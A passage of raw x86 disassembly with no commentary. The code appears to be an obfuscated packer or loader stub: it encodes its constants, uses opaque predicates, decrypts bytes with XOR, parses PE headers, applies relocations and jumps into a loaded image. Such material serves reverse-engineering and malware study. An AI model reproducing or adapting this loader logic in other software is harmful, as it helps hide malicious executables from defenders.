  424f67:	add    ecx,esi
  424f69:	push   ecx
  424f6a:	mov    ecx,DWORD PTR [ebp-0xc]
  424f6d:	xor    ecx,ebx
  424f6f:	add    ecx,esi
  424f71:	push   ecx
  424f72:	push   edi
  424f73:	call   DWORD PTR [eax+0x18]
  424f76:	mov    eax,DWORD PTR [ebp-0x40]
  424f79:	add    eax,0xffcd8d14
  424f7e:	xor    eax,ebx
  424f80:	cmp    eax,0xf89c85b0
  424f85:	mov    eax,DWORD PTR [ebp+0x8]
  424f88:	mov    eax,DWORD PTR [eax+0x1d8]
  424f8e:	mov    ecx,DWORD PTR [ebp-0x50]
  424f91:	jne    0x424fb4
  424f93:	xor    ecx,ebx
  424f95:	add    ecx,esi
  424f97:	push   ecx
  424f98:	mov    ecx,DWORD PTR [ebp-0xc]
  424f9b:	xor    ecx,ebx
  424f9d:	add    ecx,esi
  424f9f:	push   ecx
  424fa0:	push   DWORD PTR [ebp-0x2c]
  424fa3:	call   DWORD PTR [eax+0x18]
  424fa6:	mov    eax,DWORD PTR [ebp-0x24]
  424fa9:	mov    DWORD PTR [ebp-0x2c],eax
  424fac:	mov    eax,DWORD PTR [ebp-0x20]
  424faf:	mov    DWORD PTR [ebp-0x3c],eax
  424fb2:	jmp    0x424fc7
  424fb4:	xor    ecx,ebx
  424fb6:	add    ecx,esi
  424fb8:	push   ecx
  424fb9:	mov    ecx,DWORD PTR [ebp-0xc]
  424fbc:	xor    ecx,ebx
  424fbe:	add    ecx,esi
  424fc0:	push   ecx
  424fc1:	push   DWORD PTR [ebp-0x24]
  424fc4:	call   DWORD PTR [eax+0x18]
  424fc7:	mov    eax,DWORD PTR [ebp-0x3c]
  424fca:	mov    DWORD PTR [ebp-0x34],eax
  424fcd:	mov    eax,DWORD PTR [ebp-0x2c]
  424fd0:	mov    DWORD PTR [ebp-0x28],0xf89c85b0
  424fd7:	mov    DWORD PTR [ebp-0x40],eax
  424fda:	mov    edi,0xf89c85b1
  424fdf:	mov    DWORD PTR [ebp-0x30],edi
  424fe2:	mov    eax,DWORD PTR [ebp-0x28]
  424fe5:	xor    eax,ebx
  424fe7:	add    eax,esi
  424fe9:	mov    DWORD PTR [ebp-0xc],eax
  424fec:	mov    eax,DWORD PTR [ebp-0x28]
  424fef:	xor    eax,ebx
  424ff1:	add    eax,esi
  424ff3:	mov    DWORD PTR [ebp-0x14],eax
  424ff6:	mov    DWORD PTR [ebp-0x44],0xf89c8590
  424ffd:	mov    DWORD PTR [ebp-0x24],0xf89c85bf
  425004:	mov    eax,DWORD PTR [ebp-0x28]
  425007:	mov    ecx,DWORD PTR [ebp-0x34]
  42500a:	xor    eax,ebx
  42500c:	add    eax,esi
  42500e:	cmp    ecx,eax
  425010:	je     0x425206
  425016:	jmp    0x4251e2
  42501b:	mov    ecx,DWORD PTR [ebp-0xc]
  42501e:	mov    eax,DWORD PTR [ebp-0x34]
  425021:	sub    eax,ecx
  425023:	mov    ecx,DWORD PTR [ebp-0x44]
  425026:	xor    ecx,ebx
  425028:	add    ecx,esi
  42502a:	xor    edx,edx
  42502c:	div    ecx
  42502e:	mov    DWORD PTR [ebp-0x14],eax
  425031:	mov    eax,DWORD PTR [ebp-0x24]
  425034:	mov    ecx,DWORD PTR [ebp-0x14]
  425037:	xor    eax,ebx
  425039:	add    eax,esi
  42503b:	cmp    ecx,eax
  42503d:	jbe    0x425049
  42503f:	mov    eax,DWORD PTR [ebp-0x24]
  425042:	xor    eax,ebx
  425044:	add    eax,esi
  425046:	mov    DWORD PTR [ebp-0x14],eax
  425049:	mov    eax,DWORD PTR [ebp-0x44]
  42504c:	mov    ecx,DWORD PTR [ebp-0x14]
  42504f:	xor    eax,ebx
  425051:	add    eax,esi
  425053:	imul   eax,ecx
  425056:	mov    DWORD PTR [ebp-0x14],eax
  425059:	mov    eax,DWORD PTR [ebp-0x28]
  42505c:	mov    ecx,DWORD PTR [ebp-0x14]
  42505f:	xor    eax,ebx
  425061:	add    eax,esi
  425063:	cmp    ecx,eax
  425065:	je     0x4251d0
  42506b:	mov    eax,DWORD PTR [ebp-0x14]
  42506e:	mov    DWORD PTR [ebp-0x20],eax
  425071:	mov    eax,DWORD PTR [ebp-0xc]
  425074:	add    eax,DWORD PTR [ebp-0x40]
  425077:	mov    DWORD PTR [ebp-0x4c],0xf89c85b0
  42507e:	mov    DWORD PTR [ebp-0x14],edi
  425081:	mov    DWORD PTR [ebp-0x54],0xf89c85b2
  425088:	mov    DWORD PTR [ebp-0x1c],eax
  42508b:	mov    DWORD PTR [ebp-0x38],0xf89c85b3
  425092:	mov    DWORD PTR [ebp-0x8],edi
  425095:	mov    eax,DWORD PTR [ebp-0x4c]
  425098:	xor    eax,ebx
  42509a:	add    eax,esi
  42509c:	jmp    0x42518f
  4250a1:	mov    DWORD PTR [ebp-0xe4],0xf89c85bb
  4250ab:	mov    DWORD PTR [ebp-0xd0],0xf89c858e
  4250b5:	mov    eax,DWORD PTR [ebp-0x8]
  4250b8:	mov    ecx,DWORD PTR [ebp-0x18]
  4250bb:	xor    eax,ebx
  4250bd:	add    eax,esi
  4250bf:	imul   eax,ecx
  4250c2:	mov    ecx,DWORD PTR [ebp-0x1c]
  4250c5:	mov    al,BYTE PTR [eax+ecx*1]
  4250c8:	mov    BYTE PTR [ebp-0x1],al
  4250cb:	mov    eax,DWORD PTR [ebp-0x8]
  4250ce:	mov    ecx,DWORD PTR [ebp-0x18]
  4250d1:	xor    eax,ebx
  4250d3:	add    eax,esi
  4250d5:	imul   eax,ecx
  4250d8:	mov    ecx,DWORD PTR [ebp-0x54]
  4250db:	xor    ecx,ebx
  4250dd:	add    eax,ecx
  4250df:	mov    ecx,DWORD PTR [ebp-0x1c]
  4250e2:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272ec]
  4250ea:	mov    ecx,DWORD PTR [ebp-0xe4]
  4250f0:	xor    ecx,ebx
  4250f2:	lea    eax,[ecx+eax*1+0x3272ec]
  4250f9:	movzx  ecx,BYTE PTR [ebp-0x1]
  4250fd:	xor    ecx,eax
  4250ff:	mov    BYTE PTR [ebp-0x1],cl
  425102:	mov    al,BYTE PTR [ebp-0x1]
  425105:	mov    ecx,DWORD PTR [ebp-0x8]
  425108:	mov    edx,DWORD PTR [ebp-0x18]
  42510b:	xor    ecx,ebx
  42510d:	add    ecx,esi
  42510f:	imul   ecx,edx
  425112:	mov    edx,DWORD PTR [ebp-0x1c]
  425115:	mov    BYTE PTR [ecx+edx*1],al
  425118:	mov    eax,DWORD PTR [ebp-0x8]
  42511b:	mov    ecx,DWORD PTR [ebp-0x18]
  42511e:	xor    eax,ebx
  425120:	add    eax,esi
  425122:	imul   eax,ecx
  425125:	mov    ecx,DWORD PTR [ebp-0x1c]
  425128:	mov    al,BYTE PTR [eax+ecx*1]
  42512b:	mov    BYTE PTR [ebp-0x1],al
  42512e:	mov    eax,DWORD PTR [ebp-0x8]
  425131:	mov    ecx,DWORD PTR [ebp-0x18]
  425134:	xor    eax,ebx
  425136:	add    eax,esi
  425138:	imul   eax,ecx
  42513b:	mov    ecx,DWORD PTR [ebp-0x14]
  42513e:	xor    ecx,ebx
  425140:	add    eax,ecx
  425142:	mov    ecx,DWORD PTR [ebp-0x1c]
  425145:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272ec]
  42514d:	mov    ecx,DWORD PTR [ebp-0xd0]
  425153:	xor    ecx,ebx
  425155:	lea    eax,[ecx+eax*1+0x3272ec]
  42515c:	movzx  ecx,BYTE PTR [ebp-0x1]
  425160:	xor    ecx,eax
  425162:	mov    BYTE PTR [ebp-0x1],cl
  425165:	mov    al,BYTE PTR [ebp-0x1]
  425168:	mov    ecx,DWORD PTR [ebp-0x8]
  42516b:	mov    edx,DWORD PTR [ebp-0x18]
  42516e:	xor    ecx,ebx
  425170:	add    ecx,esi
  425172:	imul   ecx,edx
  425175:	mov    edx,DWORD PTR [ebp-0x1c]
  425178:	mov    BYTE PTR [ecx+edx*1],al
  42517b:	mov    eax,DWORD PTR [ebp-0x38]
  42517e:	mov    ecx,DWORD PTR [ebp-0x14]
  425181:	xor    eax,ebx
  425183:	xor    ecx,ebx
  425185:	add    eax,esi
  425187:	add    ecx,esi
  425189:	imul   eax,ecx
  42518c:	add    eax,DWORD PTR [ebp-0x18]
  42518f:	mov    DWORD PTR [ebp-0x18],eax
  425192:	mov    eax,DWORD PTR [ebp-0x18]
  425195:	mov    ecx,DWORD PTR [ebp-0x20]
  425198:	cmp    ecx,eax
  42519a:	jb     0x4250a1
  4251a0:	mov    eax,DWORD PTR [ebp-0x14]
  4251a3:	mov    ecx,DWORD PTR [ebp-0x20]
  4251a6:	xor    eax,ebx
  4251a8:	add    eax,esi
  4251aa:	imul   eax,ecx
  4251ad:	mov    ecx,DWORD PTR [ebp-0x4c]
  4251b0:	xor    ecx,ebx
  4251b2:	add    ecx,esi
  4251b4:	or     eax,ecx
  4251b6:	mov    ecx,DWORD PTR [ebp-0x30]
  4251b9:	xor    ecx,ebx
  4251bb:	add    eax,ecx
  4251bd:	mov    ecx,DWORD PTR [ebp-0x30]
  4251c0:	xor    ecx,ebx
  4251c2:	add    eax,ecx
  4251c4:	mov    ecx,DWORD PTR [ebp-0xc]
  4251c7:	lea    eax,[eax+ecx*1+0x64e5d8]
  4251ce:	jmp    0x4251df
  4251d0:	mov    eax,DWORD PTR [ebp-0x30]
  4251d3:	mov    ecx,DWORD PTR [ebp-0xc]
  4251d6:	xor    eax,ebx
  4251d8:	lea    eax,[eax+ecx*1+0x3272ec]
  4251df:	mov    DWORD PTR [ebp-0xc],eax
  4251e2:	mov    eax,DWORD PTR [ebp-0x30]
  4251e5:	xor    eax,ebx
  4251e7:	mov    ecx,0xffcd8d14
  4251ec:	sub    ecx,eax
  4251ee:	add    ecx,DWORD PTR [ebp-0x34]
  4251f1:	mov    eax,DWORD PTR [ebp-0x30]
  4251f4:	mov    edx,DWORD PTR [ebp-0xc]
  4251f7:	xor    eax,ebx
  4251f9:	add    eax,esi
  4251fb:	imul   eax,edx
  4251fe:	cmp    eax,ecx
  425200:	jbe    0x42501b
  425206:	push   DWORD PTR [ebp+0x8]
  425209:	mov    eax,DWORD PTR [ebp+0x8]
  42520c:	push   DWORD PTR [eax+0x1cc]
  425212:	lea    eax,[ebp-0xd8]
  425218:	push   eax
  425219:	mov    eax,DWORD PTR [ebp+0x8]
  42521c:	mov    eax,DWORD PTR [eax+0x1c4]
  425222:	push   DWORD PTR [eax]
  425224:	mov    eax,DWORD PTR [ebp+0x8]
  425227:	mov    eax,DWORD PTR [eax+0x1c0]
  42522d:	push   DWORD PTR [eax]
  42522f:	push   DWORD PTR [ebp-0x3c]
  425232:	push   DWORD PTR [ebp-0x2c]
  425235:	call   0x425ccc
  42523a:	mov    DWORD PTR [ebp-0x40],eax
  42523d:	mov    eax,DWORD PTR [ebp-0x10]
  425240:	mov    ecx,DWORD PTR [ebp-0x2c]
  425243:	xor    eax,ebx
  425245:	add    eax,esi
  425247:	cmp    eax,ecx
  425249:	je     0x42526a
  42524b:	mov    eax,DWORD PTR [ebp+0x8]
  42524e:	mov    ecx,DWORD PTR [ebp-0x50]
  425251:	mov    eax,DWORD PTR [eax+0x1d8]
  425257:	xor    ecx,ebx
  425259:	add    ecx,esi
  42525b:	push   ecx
  42525c:	mov    ecx,DWORD PTR [ebp-0x10]
  42525f:	xor    ecx,ebx
  425261:	add    ecx,esi
  425263:	push   ecx
  425264:	push   DWORD PTR [ebp-0x2c]
  425267:	call   DWORD PTR [eax+0x18]
  42526a:	pop    edi
  42526b:	pop    esi
  42526c:	pop    ebx
  42526d:	leave  
  42526e:	ret    0x4
  425271:	push   ebp
  425272:	mov    ebp,esp
  425274:	push   ecx
  425275:	push   ecx
  425276:	lea    eax,[ebp-0x8]
  425279:	mov    DWORD PTR [ebp-0x4],eax
  42527c:	push   esi
  42527d:	mov    esi,DWORD PTR [ebp-0x4]
  425280:	mov    eax,0xf881ba2e
  425285:	mov    DWORD PTR [esi],eax
  425287:	mov    esi,DWORD PTR [ebp-0x8]
  42528a:	cmp    esi,eax
  42528c:	pop    esi
  42528d:	jne    0x425297
  42528f:	mov    BYTE PTR [ecx+0xa],0x7a
  425293:	mov    BYTE PTR [edx+0x8],0x2f
  425297:	mov    BYTE PTR [edx+0xa],0x7a
  42529b:	mov    BYTE PTR [ecx+0x2],0x8
  42529f:	leave  
  4252a0:	ret    
  4252a1:	push   ebp
  4252a2:	mov    ebp,esp
  4252a4:	push   ecx
  4252a5:	push   ecx
  4252a6:	lea    eax,[ebp-0x8]
  4252a9:	mov    DWORD PTR [ebp-0x4],eax
  4252ac:	mov    edx,DWORD PTR [ebp-0x4]
  4252af:	mov    eax,0xf88b0bca
  4252b4:	mov    DWORD PTR [edx],eax
  4252b6:	mov    edx,DWORD PTR [ebp-0x8]
  4252b9:	cmp    edx,eax
  4252bb:	jne    0x4252cc
  4252bd:	mov    eax,DWORD PTR [ebp+0x8]
  4252c0:	mov    BYTE PTR [ecx+0x9],0xe
  4252c4:	mov    BYTE PTR [eax+0x7],0x57
  4252c8:	mov    BYTE PTR [ecx+0x6],0xf
  4252cc:	mov    BYTE PTR [ecx+0x3],0x1e
  4252d0:	leave  
  4252d1:	ret    0x4
  4252d4:	push   ebp
  4252d5:	mov    ebp,esp
  4252d7:	push   ecx
  4252d8:	push   ecx
  4252d9:	lea    eax,[ebp-0x8]
  4252dc:	mov    DWORD PTR [ebp-0x4],eax
  4252df:	mov    edx,DWORD PTR [ebp-0x4]
  4252e2:	mov    eax,0x7e0da2e
  4252e7:	mov    DWORD PTR [edx],eax
  4252e9:	mov    edx,DWORD PTR [ebp-0x8]
  4252ec:	cmp    edx,eax
  4252ee:	jne    0x4252f4
  4252f0:	mov    BYTE PTR [ecx+0x7],0x57
  4252f4:	mov    eax,DWORD PTR [ebp+0x8]
  4252f7:	mov    BYTE PTR [ecx+0x1],0x15
  4252fb:	mov    BYTE PTR [eax+0x9],0x2e
  4252ff:	leave  
  425300:	ret    0x4
  425303:	push   ebp
  425304:	mov    ebp,esp
  425306:	push   ecx
  425307:	push   ecx
  425308:	lea    eax,[ebp-0x8]
  42530b:	mov    DWORD PTR [ebp-0x4],eax
  42530e:	push   esi
  42530f:	mov    esi,DWORD PTR [ebp-0x4]
  425312:	mov    eax,0x7060e3f
  425317:	mov    DWORD PTR [esi],eax
  425319:	mov    esi,DWORD PTR [ebp-0x8]
  42531c:	cmp    esi,eax
  42531e:	pop    esi
  42531f:	jne    0x42532b
  425321:	mov    BYTE PTR [edx+0x4],0xb
  425325:	mov    WORD PTR [ecx+0x3],0xb1e
  42532b:	mov    BYTE PTR [edx],0x3f
  42532e:	leave  
  42532f:	ret    
  425330:	push   ebp
  425331:	mov    ebp,esp
  425333:	push   ecx
  425334:	push   ecx
  425335:	lea    eax,[ebp-0x8]
  425338:	mov    DWORD PTR [ebp-0x4],eax
  42533b:	mov    edx,DWORD PTR [ebp-0x4]
  42533e:	mov    eax,0xf8870b3e
  425343:	mov    DWORD PTR [edx],eax
  425345:	mov    edx,DWORD PTR [ebp-0x8]
  425348:	cmp    edx,eax
  42534a:	jne    0x425357
  42534c:	mov    eax,DWORD PTR [ebp+0x8]
  42534f:	mov    BYTE PTR [ecx+0x8],0xf
  425353:	mov    BYTE PTR [eax+0x1],0x15
  425357:	mov    BYTE PTR [ecx+0x5],0x3
  42535b:	leave  
  42535c:	ret    0x4
  42535f:	push   esi
  425360:	mov    ecx,edi
  425362:	call   0x425330
  425367:	mov    edx,edi
  425369:	mov    ecx,esi
  42536b:	mov    BYTE PTR [esi],0x1f
  42536e:	call   0x425303
  425373:	push   esi
  425374:	mov    ecx,edi
  425376:	mov    BYTE PTR [esi+0x5],0x3
  42537a:	call   0x4252d4
  42537f:	push   esi
  425380:	mov    BYTE PTR [esi+0x6],0xf
  425384:	call   0x4252a1
  425389:	mov    BYTE PTR [esi+0x2],0x8
  42538d:	mov    edx,esi
  42538f:	jmp    0x425271
  425394:	push   ebp
  425395:	mov    ebp,esp
  425397:	push   ecx
  425398:	mov    ecx,DWORD PTR [edx+0x194]
  42539e:	push   esi
  42539f:	mov    esi,DWORD PTR [ebp+0x8]
  4253a2:	mov    esi,DWORD PTR [esi]
  4253a4:	mov    DWORD PTR [ecx],esi
  4253a6:	mov    ecx,DWORD PTR [edx+0x194]
  4253ac:	mov    ecx,DWORD PTR [ecx]
  4253ae:	mov    esi,DWORD PTR [edx+0x190]
  4253b4:	mov    DWORD PTR [esi],ecx
  4253b6:	mov    eax,DWORD PTR [edx+0x194]
  4253bc:	mov    ecx,DWORD PTR [eax]
  4253be:	mov    ecx,DWORD PTR [ecx+0x3c]
  4253c1:	add    ecx,DWORD PTR [eax]
  4253c3:	mov    DWORD PTR [ebp-0x4],0xf89ca5b0
  4253ca:	mov    eax,DWORD PTR [ebp-0x4]
  4253cd:	movzx  ecx,WORD PTR [ecx+0x16]
  4253d1:	xor    eax,0x75108a4
  4253d6:	add    eax,0x3272ec
  4253db:	pop    esi
  4253dc:	test   ecx,eax
  4253de:	je     0x4253ec
  4253e0:	mov    eax,DWORD PTR [edx+0x1c8]
  4253e6:	mov    DWORD PTR [eax],0xf89c85b1
  4253ec:	leave  
  4253ed:	ret    0x4
  4253f0:	push   ebp
  4253f1:	mov    ebp,esp
  4253f3:	sub    esp,0x70
  4253f6:	and    DWORD PTR [ebp-0x20],0x0
  4253fa:	mov    DWORD PTR [ebp-0x18],0xf89cb5b0
  425401:	mov    DWORD PTR [ebp-0x1c],0xf89c85f0
  425408:	mov    DWORD PTR [ebp-0x2c],0xf89c85bc
  42540f:	mov    DWORD PTR [ebp-0x14],0xf89c85b2
  425416:	mov    DWORD PTR [ebp-0x2c],0xf89f05b0
  42541d:	mov    eax,DWORD PTR [ebp+0x20]
  425420:	mov    eax,DWORD PTR [eax+0x194]
  425426:	mov    DWORD PTR [ebp-0xc],eax
  425429:	mov    eax,DWORD PTR [ebp+0x20]
  42542c:	push   ebx
  42542d:	push   esi
  42542e:	mov    esi,DWORD PTR [eax+0x190]
  425434:	mov    eax,DWORD PTR [ebp+0x20]
  425437:	mov    eax,DWORD PTR [eax+0x18c]
  42543d:	mov    DWORD PTR [ebp-0x8],eax
  425440:	mov    eax,DWORD PTR [eax]
  425442:	push   edi
  425443:	mov    DWORD PTR [ebp-0x4],esi
  425446:	test   eax,eax
  425448:	jne    0x425455
  42544a:	push   DWORD PTR [ebp+0x1c]
  42544d:	mov    edx,DWORD PTR [ebp+0x20]
  425450:	call   0x425394
  425455:	mov    eax,DWORD PTR [esi]
  425457:	mov    ebx,DWORD PTR [esi]
  425459:	add    ebx,DWORD PTR [eax+0x3c]
  42545c:	mov    eax,DWORD PTR [ebp+0xc]
  42545f:	mov    ecx,DWORD PTR [ebp-0x8]
  425462:	mov    ecx,DWORD PTR [ecx]
  425464:	mov    esi,0x75108a4
  425469:	xor    eax,esi
  42546b:	mov    edi,0x3272ec
  425470:	add    eax,edi
  425472:	cmp    eax,ecx
  425474:	jne    0x4256ac
  42547a:	mov    eax,DWORD PTR [ebp-0xc]
  42547d:	mov    eax,DWORD PTR [eax]
  42547f:	mov    DWORD PTR [ebp-0x10],eax
  425482:	mov    eax,DWORD PTR [ebx+0x50]
  425485:	mov    DWORD PTR [ebp-0x68],eax
  425488:	mov    eax,DWORD PTR [ebp-0x18]
  42548b:	xor    eax,esi
  42548d:	add    eax,edi
  42548f:	mov    DWORD PTR [ebp-0x64],eax
  425492:	mov    eax,DWORD PTR [ebp-0x14]
  425495:	and    DWORD PTR [ebp-0x6c],0x0
  425499:	xor    eax,esi
  42549b:	add    eax,edi
  42549d:	mov    DWORD PTR [ebp-0x60],eax
  4254a0:	lea    eax,[ebp-0x70]
  4254a3:	push   eax
  4254a4:	mov    eax,DWORD PTR [ebp+0x8]
  4254a7:	xor    eax,esi
  4254a9:	add    eax,edi
  4254ab:	push   eax
  4254ac:	mov    eax,DWORD PTR [ebp+0x20]
  4254af:	add    eax,0xaa
  4254b4:	push   eax
  4254b5:	mov    eax,DWORD PTR [ebp+0x20]
  4254b8:	mov    eax,DWORD PTR [eax+0x198]
  4254be:	mov    DWORD PTR [ebp-0x70],0x4
  4254c5:	push   DWORD PTR [eax]
  4254c7:	mov    eax,DWORD PTR [ebp+0x10]
  4254ca:	call   eax
  4254cc:	mov    ecx,DWORD PTR [ebp-0xc]
  4254cf:	mov    ecx,DWORD PTR [ecx]
  4254d1:	mov    edx,DWORD PTR [ebp-0x8]
  4254d4:	mov    DWORD PTR [ebp-0x6c],eax
  4254d7:	mov    DWORD PTR [ebp+0x1c],eax
  4254da:	mov    DWORD PTR [edx],ecx
  4254dc:	mov    ecx,DWORD PTR [ebp-0x4]
  4254df:	mov    DWORD PTR [ecx],eax
  4254e1:	mov    eax,DWORD PTR [ebx+0x50]
  4254e4:	mov    DWORD PTR [ebp-0x68],eax
  4254e7:	mov    eax,DWORD PTR [ebp-0x1c]
  4254ea:	xor    eax,esi
  4254ec:	add    eax,edi
  4254ee:	mov    DWORD PTR [ebp-0x64],eax
  4254f1:	lea    eax,[ebp-0x20]
  4254f4:	mov    DWORD PTR [ebp-0x60],eax
  4254f7:	lea    eax,[ebp-0x70]
  4254fa:	push   eax
  4254fb:	mov    eax,DWORD PTR [ebp+0x8]
  4254fe:	xor    eax,esi
  425500:	add    eax,edi
  425502:	push   eax
  425503:	mov    eax,DWORD PTR [ebp+0x20]
  425506:	add    eax,0xee
  42550b:	push   eax
  42550c:	mov    eax,DWORD PTR [ebp+0x20]
  42550f:	mov    eax,DWORD PTR [eax+0x198]
  425515:	mov    DWORD PTR [ebp-0x70],0x4
  42551c:	push   DWORD PTR [eax]
  42551e:	mov    eax,DWORD PTR [ebp+0x10]
  425521:	call   eax
  425523:	test   eax,eax
  425525:	je     0x42554a
  425527:	and    DWORD PTR [ebp+0xc],0x0
  42552b:	cmp    DWORD PTR [ebx+0x50],0x0
  42552f:	jbe    0x42554a
  425531:	mov    eax,DWORD PTR [ebp+0x1c]
  425534:	mov    ecx,DWORD PTR [ebp-0x10]
  425537:	sub    ecx,eax
  425539:	mov    dl,BYTE PTR [ecx+eax*1]
  42553c:	inc    DWORD PTR [ebp+0xc]
  42553f:	mov    BYTE PTR [eax],dl
  425541:	mov    edx,DWORD PTR [ebp+0xc]
  425544:	inc    eax
  425545:	cmp    edx,DWORD PTR [ebx+0x50]
  425548:	jb     0x425539
  42554a:	mov    edx,DWORD PTR [ebp+0x1c]
  42554d:	mov    ecx,DWORD PTR [edx+0x3c]
  425550:	add    ecx,edx
  425552:	mov    eax,DWORD PTR [ecx+0xa0]
  425558:	mov    ebx,DWORD PTR [ecx+0x28]
  42555b:	add    eax,edx
  42555d:	sub    edx,DWORD PTR [ebp-0x10]
  425560:	add    ebx,DWORD PTR [ebp+0x1c]
  425563:	mov    DWORD PTR [ebp+0xc],edx
  425566:	mov    DWORD PTR [ebp-0x2c],ecx
  425569:	mov    DWORD PTR [ebp-0x14],ebx
  42556c:	mov    DWORD PTR [ebp-0x8],0x0
  425573:	jmp    0x4255ef
  425575:	add    edx,0xfffffff8
  425578:	shr    edx,1
  42557a:	mov    DWORD PTR [ebp-0x18],edx
  42557d:	je     0x4255db
  42557f:	lea    edx,[eax+0x8]
  425582:	mov    DWORD PTR [ebp-0x4],edx
  425585:	mov    edx,DWORD PTR [ebp-0x18]
  425588:	mov    DWORD PTR [ebp-0x18],edx
  42558b:	mov    edx,DWORD PTR [ebp-0x4]
  42558e:	movzx  edx,WORD PTR [edx]
  425591:	mov    DWORD PTR [ebp-0x24],edx
  425594:	and    edx,0xfff
  42559a:	mov    DWORD PTR [ebp-0x28],edx
  42559d:	mov    edx,DWORD PTR [ebp-0x24]
  4255a0:	shr    edx,0xc
  4255a3:	add    edx,0xffcd8d14
  4255a9:	xor    edx,esi
  4255ab:	cmp    edx,0xf89c85b3
  4255b1:	jne    0x4255d2
  4255b3:	mov    edx,DWORD PTR [ebp-0x28]
  4255b6:	add    edx,DWORD PTR [ebp+0x1c]
  4255b9:	mov    ebx,DWORD PTR [eax]
  4255bb:	cmp    DWORD PTR [ebx+edx*1],0x0
  4255bf:	je     0x4255cf
  4255c1:	mov    ecx,DWORD PTR [ebp+0xc]
  4255c4:	add    ecx,DWORD PTR [ebx+edx*1]
  4255c7:	mov    ebx,DWORD PTR [eax]
  4255c9:	mov    DWORD PTR [edx+ebx*1],ecx
  4255cc:	mov    ecx,DWORD PTR [ebp-0x2c]
  4255cf:	mov    ebx,DWORD PTR [ebp-0x14]
  4255d2:	add    DWORD PTR [ebp-0x4],0x2
  4255d6:	dec    DWORD PTR [ebp-0x18]
  4255d9:	jne    0x42558b
  4255db:	mov    edx,DWORD PTR [ebp-0xc]
  4255de:	add    DWORD PTR [ebp-0x8],edx
  4255e1:	mov    edx,DWORD PTR [ebp-0x8]
  4255e4:	cmp    edx,DWORD PTR [ecx+0xa4]
  4255ea:	jae    0x4255fd
  4255ec:	add    eax,DWORD PTR [ebp-0xc]
  4255ef:	mov    edx,DWORD PTR [eax+0x4]
  4255f2:	mov    DWORD PTR [ebp-0xc],edx
  4255f5:	test   edx,edx
  4255f7:	jne    0x425575
  4255fd:	mov    eax,DWORD PTR [ebp-0x10]
  425600:	mov    DWORD PTR [ebp-0x6c],eax
  425603:	mov    DWORD PTR [ebp-0x70],0x4
  42560a:	mov    eax,DWORD PTR [ecx+0x50]
  42560d:	mov    DWORD PTR [ebp-0x68],eax
  425610:	mov    eax,DWORD PTR [ebp-0x1c]
  425613:	xor    eax,esi
  425615:	add    eax,edi
  425617:	mov    DWORD PTR [ebp-0x64],eax
  42561a:	lea    eax,[ebp-0x20]
  42561d:	mov    DWORD PTR [ebp-0x60],eax
  425620:	lea    eax,[ebp-0x70]
  425623:	push   eax
  425624:	mov    eax,DWORD PTR [ebp+0x8]
  425627:	xor    eax,esi
  425629:	add    eax,edi
  42562b:	push   eax
  42562c:	mov    eax,DWORD PTR [ebp+0x20]
  42562f:	add    eax,0xee
  425634:	push   eax
  425635:	mov    eax,DWORD PTR [ebp+0x20]
  425638:	mov    eax,DWORD PTR [eax+0x198]
  42563e:	push   DWORD PTR [eax]
  425640:	mov    eax,DWORD PTR [ebp+0x10]
  425643:	call   eax
  425645:	mov    eax,DWORD PTR [ebp+0x20]
  425648:	mov    eax,DWORD PTR [eax+0x180]
  42564e:	add    eax,DWORD PTR [ebp+0xc]
  425651:	mov    ecx,DWORD PTR [ebp+0xc]
  425654:	push   DWORD PTR [ebp+0x18]
  425657:	mov    DWORD PTR [eax],ecx
  425659:	push   DWORD PTR [ebp+0x14]
  42565c:	push   DWORD PTR [ebp+0x1c]
  42565f:	call   ebx
  425661:	mov    ecx,DWORD PTR [ebp+0xc]
  425664:	add    ecx,DWORD PTR [ebp+0x20]
  425667:	lea    eax,[ebp+0x4]
  42566a:	mov    DWORD PTR [ebp+0x20],ecx
  42566d:	mov    ecx,DWORD PTR [ebp+0x20]
  425670:	mov    ecx,DWORD PTR [ebp+0x20]
  425673:	mov    edx,DWORD PTR [ecx+0x190]
  425679:	mov    ecx,DWORD PTR [ebp+0x20]
  42567c:	mov    ecx,DWORD PTR [ecx+0x18c]
  425682:	mov    esi,DWORD PTR [ecx]
  425684:	cmp    DWORD PTR [eax],esi
  425686:	jb     0x4256a7
  425688:	mov    esi,DWORD PTR [edx]
  42568a:	mov    edi,DWORD PTR [edx]
  42568c:	mov    esi,DWORD PTR [esi+0x3c]
  42568f:	lea    esi,[edi+esi*1+0x50]
  425693:	mov    edi,DWORD PTR [ecx]
  425695:	add    edi,DWORD PTR [esi]
  425697:	cmp    DWORD PTR [eax],edi
  425699:	jae    0x4256a7
  42569b:	mov    esi,DWORD PTR [ecx]
  42569d:	mov    ecx,DWORD PTR [eax]
  42569f:	mov    edx,DWORD PTR [edx]
  4256a1:	sub    ecx,esi
  4256a3:	add    edx,ecx
  4256a5:	mov    DWORD PTR [eax],edx
  4256a7:	mov    eax,DWORD PTR [ebp+0xc]
  4256aa:	jmp    0x4256ae
  4256ac:	xor    eax,eax
  4256ae:	pop    edi
  4256af:	pop    esi
  4256b0:	pop    ebx
  4256b1:	leave  
  4256b2:	ret    0x1c
  4256b5:	push   ebp
  4256b6:	mov    ebp,esp
  4256b8:	sub    esp,0x1c
  4256bb:	push   esi
  4256bc:	mov    esi,eax
  4256be:	mov    eax,DWORD PTR [ecx+0x190]
  4256c4:	cmp    DWORD PTR [eax],0x0
  4256c7:	je     0x4257d7
  4256cd:	test   edx,edx
  4256cf:	je     0x4257d7
  4256d5:	test   esi,esi
  4256d7:	je     0x4257d7
  4256dd:	mov    eax,DWORD PTR [esi+0x88]
  4256e3:	test   eax,eax
  4256e5:	je     0x4257d2
  4256eb:	cmp    DWORD PTR [esi+0x8c],0x10
  4256f2:	je     0x4257d2
  4256f8:	cmp    DWORD PTR [esi+0x34],edx
  4256fb:	je     0x4257d2
  425701:	mov    esi,DWORD PTR [ecx+0x18c]
  425707:	and    DWORD PTR [ebp-0x10],0x0
  42570b:	mov    ecx,edx
  42570d:	sub    ecx,DWORD PTR [esi]
  42570f:	add    eax,edx
  425711:	movzx  edx,WORD PTR [eax+0xc]
  425715:	mov    DWORD PTR [ebp-0x1c],ecx
  425718:	movzx  ecx,WORD PTR [eax+0xe]
  42571c:	add    ecx,edx
  42571e:	je     0x4257d2
  425724:	lea    ecx,[eax+0x14]
  425727:	push   ebx
  425728:	mov    DWORD PTR [ebp-0x18],ecx
  42572b:	mov    esi,0x7fffffff
  425730:	push   edi
  425731:	test   DWORD PTR [ecx],esi
  425733:	je     0x4257b4
  425735:	mov    edx,DWORD PTR [ecx]
